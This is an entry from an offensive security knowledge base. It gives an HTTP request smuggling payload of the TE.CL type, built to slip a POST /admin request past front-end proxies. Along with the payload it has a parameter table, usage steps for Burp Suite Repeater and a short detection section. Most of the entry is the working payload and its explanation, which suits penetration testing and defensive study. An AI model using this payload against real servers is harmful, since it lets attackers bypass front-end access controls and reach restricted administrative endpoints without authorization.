---
id: 57d1df17-5610-4b9c-9189-616b08b6f377
type: code
language: http
verified: true
created_at: '2020-08-12T18:51:07.853119+00:00'
updated_at: '2023-05-29T16:48:53.365139+00:00'
platforms:
  - Web
tags:
  - http-request-smuggling
  - payload
validated: true
---

# HTTP-Smuggling-TE-CL-Basic-Request

## Code

```
60
POST /admin HTTP/1.1
Content-Type:  application/x-www-form-urlencoded
Content-Length: 15 
x=1
0
```

## Description

This code snippet represents a basic HTTP request smuggling payload using TE.CL (Transfer-Encoding: Chunked with Content-Length). It prepends a chunked-encoded prefix (size 60 followed by a POST request body) to confuse front-end proxies, allowing the smuggled POST /admin request to reach the backend. The '60' indicates the chunk size, followed by the request, and '0' terminates the chunk.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| /admin | Target endpoint for smuggling | /admin |
| x=1 | Sample form data in the body | x=1 |
| 15 | Content-Length for the prefix body | 15 |
| 60 | Chunk size for Transfer-Encoding | 60 |

## Usage

Paste this payload into Burp Suite Repeater as a modified request to test for TE.CL smuggling vulnerabilities. It is used in procedures like [[procedures/HTTP-Request-Smuggling-TE-CL-to-Bypass-Front-End-Controls]] to bypass front-end controls and access restricted areas.

## Detection

- WAF or proxy logs showing requests with both Transfer-Encoding: chunked and Content-Length headers.
- Anomalous chunked requests without proper termination.
- Backend access logs for unauthorized endpoints triggered by front-end legitimate traffic.
